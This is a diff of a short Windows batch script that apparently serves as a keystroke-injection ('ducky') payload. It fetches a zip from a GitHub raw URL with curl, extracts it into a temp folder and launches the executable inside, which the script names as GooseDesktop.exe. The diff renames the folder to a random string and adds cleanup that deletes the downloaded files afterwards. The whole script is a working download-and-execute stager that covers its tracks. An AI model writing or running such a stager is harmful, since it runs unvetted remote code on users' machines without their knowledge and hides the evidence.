@@ -1,7 +1,8 @@
 @echo off
 set "URL=https://raw.githubusercontent.com/BLOCKCE/ducky/refs/heads/main/dg.zip"
 set "EXE=GooseDesktop.exe"
-set "DIR=%TEMP%\pkg"
+set "DIR=%TEMP%\awdiojawdoij"
 
 rmdir /s /q "%DIR%" 2>nul & mkdir "%DIR%"
-curl -Ls "%URL%" -o "%TEMP%\pkg.zip" && tar -xf "%TEMP%\pkg.zip" -C "%DIR%" && start "" "%DIR%\%EXE%"
+curl -Ls "%URL%" -o "%TEMP%\pkg.zip" && tar -xf "%TEMP%\pkg.zip" -C "%DIR%" && start "" /wait "%DIR%\%EXE%"
+del /q "%TEMP%\pkg.zip" 2>nul & rmdir /s /q "%DIR%" 2>nul
